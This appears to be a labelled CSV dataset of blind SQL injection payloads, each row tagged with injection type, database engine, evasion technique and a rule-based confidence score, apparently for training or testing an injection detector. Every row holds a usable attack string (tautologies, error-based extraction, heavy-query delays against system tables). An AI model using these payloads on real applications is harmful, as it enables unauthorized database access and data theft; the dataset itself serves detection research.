payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
1 ) and 3861 = 5813--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 ) as afxc where 7497 = 7497,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"-6381%"" or 8571 = 8571--",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) as jlae where 1650 = 1650,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 where 7038 = 7038,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'+ ( select basp where 6953 = 6953,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-8486%' ) ) ) or 8571 = 8571--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"-3505"" ) where 2340 = 2340 or 9323 = 9323#",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1' ) ) as qhpv where 7049 = 7049 and make_set ( 8403 = 8403,8899 ) --",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) where 2808 = 2808,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1 where 5382 = 5382 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
"1' ) as bvvl where 9818 = 9818 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
1'+ ( select 'wsjk' where 3291 = 3291,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) as wehx where 5744 = 5744",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" where 8635 = 8635 and 4595 = 4595#",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1 where 7522 = 7522 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1"" where 1386 = 1386",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"-2717"" or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1 ) ) as wufr where 5239 = 5239 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" where 5477 = 5477",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1'|| ( select 'qrle' from dual where 9239 = 9239 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) ) ||'",boolean_blind,oracle,case_variation|hex_string,0.46,rule,sqliv2_csv,unknown
"1' ) where 9454 = 9454 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
"-7306"" or 2081 = 6847",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 where 5700 = 5700,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) ) as clbc where 5649 = 5649,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-2784 ) where 5261 = 5261 or 3472 = 1728#,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'|| ( select 'xmoq' from dual where 8047 = 8047 and 7533 = 7533 ) ||',boolean_blind,oracle,case_variation,0.46,rule,sqliv2_csv,unknown
"1'|| ( select 'mjkz' where 9430 = 9430 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) ) ||'",boolean_blind,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"1'+ ( select blbd where 7451 = 7451 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) ) +'",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
1' where 6003 = 6003 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1'|| ( select 'ttyt' where 3751 = 3751 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-4001' ) ) or 5634 = 4044--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" where 3368 = 3368 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' where 5023 = 5023 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-2372' or 1783 = 2656,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1' ) where 6720 = 6720 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-7663' ) ) or 1558 = 1104 and ( ( 'wsrq' = 'wsrq,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 ) ) as rvex where 3462 = 3462 and 4595 = 4595#,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) where 4500 = 4500,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) where 5680 = 5680 and ( 3020 = 3020 ) *6703--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as nhus where 3689 = 3689",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"select * from generate_series ( 7762,7762,case when ( 7762 = 1293 ) then 1 else 0 end ) limit 1--",boolean_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
1 where 3744 = 3744,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) as eaxo where 2728 = 2728",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) ) and 7533 = 7533 and ( ( 'gvoh' = 'gvoh,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1' ) ) as xjen where 6791 = 6791 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
"1"" where 3274 = 3274 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
1'|| ( select 'hkvl' from dual where 8882 = 8882,boolean_blind,oracle,case_variation,0.46,rule,sqliv2_csv,unknown
1' ) ) as tcby where 5213 = 5213,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1' ) ) as kgiw where 7452 = 7452 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1' ) and 2305 = 1934,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"-5014%"" ) ) ) or 3348 = 2430--",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) as ibaw where 2130 = 2130 and 9198 = 9198--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1'|| ( select 'dpje' where 2704 = 2704 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"1'+ ( select 'nhlx' where 2291 = 2291 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) ) +'",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"-7543' ) ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1 where 6044 = 6044 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
1'|| ( select 'fven' where 1433 = 1433 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) ) ||',boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1' ) ) ) and 1743 = 6793 and ( ( ( 'rgcv' = 'rgcv,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'+ ( select 'mjgo' where 4026 = 4026,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1 ) where 1090 = 1090 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1' and 7533 = 7533,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-4775' ) or 3038 = 3038,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) as epgz where 2898 = 2898 and 7028 = 2287#,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"-2782' ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
1' ) as wjty where 2971 = 2971,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"select * from generate_series ( 3379,3379,case when ( 3379 = 1219 ) then 1 else 0 end ) limit 1--",boolean_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
1' where 7613 = 7613,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" where 5062 = 5062",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-3938%' ) ) ) or 2034 = 7209#,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 ) as jmib where 8130 = 8130 rlike ( select ( case when ( 7885 = 3932 ) then 1 else 0x28 end ) ) --,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1'|| ( select 'lvso' where 5675 = 5675,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1' ) as lgex where 4068 = 4068 and 1378 = 9247--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 ) as zodp where 9112 = 9112,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1' ) as vmmk where 5757 = 5757 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) as jiic where 6158 = 6158 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1"" ) as rgbz where 6687 = 6687 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-1197"" ) ) as dfsy where 8857 = 8857 or 3038 = 3038",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1'|| ( select 'hwyv' from dual where 1155 = 1155 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) ) ||'",boolean_blind,oracle,case_variation,0.41,rule,sqliv2_csv,unknown
"1'|| ( select 'fmss' from dual where 7025 = 7025 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) ) ||'",boolean_blind,oracle,case_variation,0.41,rule,sqliv2_csv,unknown
"1"" ) as ltoa where 9159 = 9159 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
1' ) where 6092 = 6092,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) where 8878 = 8878 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as tkmd where 3415 = 3415 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"-4319"" ) where 7534 = 7534 or 8246 = 3217",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) ) as pdrg where 5960 = 5960 and 9198 = 9198--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 where 6304 = 6304,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"-3953 ) as wjjk where 6433 = 6433 or make_set ( 9354 = 9354,7185 ) --",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) where 1115 = 1115,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-7378' or 6872 = 6872 and 'bnmn' like 'bnmn,boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
1 ) ) as ndrh where 6308 = 6308,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1 ) as rsyw where 4857 = 4857 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
1 and 8398 = 1891-- naov,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) as zdhq where 5586 = 5586,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 where 7254 = 7254,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1' where 3425 = 3425 and elt ( 4249 = 4249,7259 ) --",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' where 7176 = 7176,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) ) ) and 7533 = 7533 and ( ( ( ""alvd"" like ""alvd",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
"1'|| ( select 'jfxs' from dual where 5485 = 5485 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,oracle,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
-1879%' ) ) or 3038 = 3038,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'+ ( select emeu where 2310 = 2310,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) as tuhc where 4018 = 4018 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
"1' where 8430 = 8430 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1'+ ( select nxfp where 5006 = 5006,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1' ) and 2006 = 2006,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as ngvf where 9912 = 9912 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) where 2725 = 2725 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-6412%' or 4065 = 5815 and '%' = ',boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) ) as uizu where 1774 = 1774,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-2715' ) ) or 6942 = 1636 and ( ( 'mqeq' = 'mqeq,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 where 2301 = 2301,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 ) where 8813 = 8813,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" and 7533 = 7533 and ""dqjp"" = ""dqjp",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) as dqgr where 2427 = 2427 and ( 3020 = 3020 ) *6703--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 where 7464 = 7464 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1'|| ( select 'uedy' where 8816 = 8816,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) ) as ylyq where 2953 = 2953 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1'+ ( select 'mxei' where 7811 = 7811 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
1 where 4372 = 4372,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"-9166"" ) as hlre where 4768 = 4768 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) as vzdq where 3160 = 3160",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' and 4595 = 4595#,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1'+ ( select niht where 7294 = 7294 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1'+ ( select bptu where 7356 = 7356 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) ) +'",boolean_blind,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"-8875"" ) where 8428 = 8428 or 1519 = 5756--",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 ) ) as xzcl where 2332 = 2332,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-9771' or 5113 = 5365,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'|| ( select 'ymre' where 8681 = 8681,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1' ) ) and 3526 = 1354,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 ) ) as vcvn where 2106 = 2106,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1 where 5332 = 5332 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1"" ) as ivuv where 5691 = 5691",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1' ) as bdei where 9531 = 9531 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as xwrq where 4161 = 4161",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 ) as phja where 4627 = 4627,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1 ) where 5550 = 5550 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",boolean_blind,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"1' ) where 6387 = 6387 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-6855' ) or 8519 = 9248,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as qrrx where 4633 = 4633 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1'+ ( select lgkd where 7801 = 7801 and elt ( 4249 = 4249,7259 ) ) +'",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as lfte where 3811 = 3811 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1' ) ) as mxxd where 7255 = 7255 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%"" ) ) and 7358 = 6986--",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
